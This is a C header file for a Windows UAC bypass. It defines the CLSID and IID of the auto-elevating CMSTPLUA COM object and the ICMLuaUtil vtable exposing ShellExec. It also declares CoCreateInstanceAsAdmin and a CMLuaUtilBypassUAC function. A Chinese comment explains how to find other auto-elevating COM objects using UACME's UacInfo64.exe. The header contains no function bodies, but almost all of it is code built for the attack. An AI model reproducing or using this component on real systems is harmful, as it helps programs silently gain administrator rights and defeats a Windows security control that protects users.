#ifndef _BYPASS_UAC_H_
#define _BYPASS_UAC_H_


#include <Windows.h>
#include <objbase.h>
#include <strsafe.h>

/**
 * 
要实现BypassUAC执行命令的COM组件，我们可以总结为两点。
Elevation属性中的Enabled跟Auto Approval为True；
COM组件中的接口存在可以执行命令，如ICMLuaUtil的ShellExec。

其中，如何寻找可利用的COM组件：
接下来我们需要快速的寻找到具备这两点的COM组件，一种方法是使用oleviewdotnet，一个一个的去看
最好的方式其实是通过编程实现对你当前机器所有的COM组件进行搜索，然后去找这个相应属性，目前已经有这样的轮子可以直接用。
使用UACME项目中的Yuubari
编译好二进制文件UacInfo64.exe，运行会在同目录下生成一个uac18363.log文件，记录其输出的结果。
使用UacInfo64.exe得到的不光是我们需要的COM组件，它会把一些其他的信息一起寻找并输出，只需要UacInfo64.exe就可以把系统上所有支持auto-elevate的都找出来。
这里使用之前提到的cmstplua进行搜索，3e5fc7f9-9a51-4367-9063-a120244fbec7，可以看到Autoelevated COM objects组件
 */
#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" /*自动提升 CMSTPLUA COM 接口*/
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}" /*cmlua shellexec方法*/


typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE *QueryInterface)(
		__RPC__in ICMLuaUtil * This,
		__RPC__in REFIID riid,
		_COM_Outptr_  void **ppvObject);

		ULONG(STDMETHODCALLTYPE *AddRef)(
			__RPC__in ICMLuaUtil * This);

		ULONG(STDMETHODCALLTYPE *Release)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method1)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method2)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method3)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method4)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method5)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method6)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *ShellExec)(
			__RPC__in ICMLuaUtil * This,
			_In_     LPCWSTR lpFile,
			_In_opt_  LPCTSTR lpParameters,
			_In_opt_  LPCTSTR lpDirectory,
			_In_      ULONG fMask,
			_In_      ULONG nShow
			);

		HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
			__RPC__in ICMLuaUtil * This,
			_In_      HKEY hKey,
			_In_opt_  LPCTSTR lpSubKey,
			_In_opt_  LPCTSTR lpValueName,
			_In_      LPCTSTR lpValueString
			);

		HRESULT(STDMETHODCALLTYPE *Method9)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method10)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method11)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method12)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method13)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method14)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method15)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method16)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method17)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method18)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method19)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method20)(
			__RPC__in ICMLuaUtil * This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid);

BOOL CMLuaUtilBypassUAC(LPCWSTR lpwszExecutable);


#endif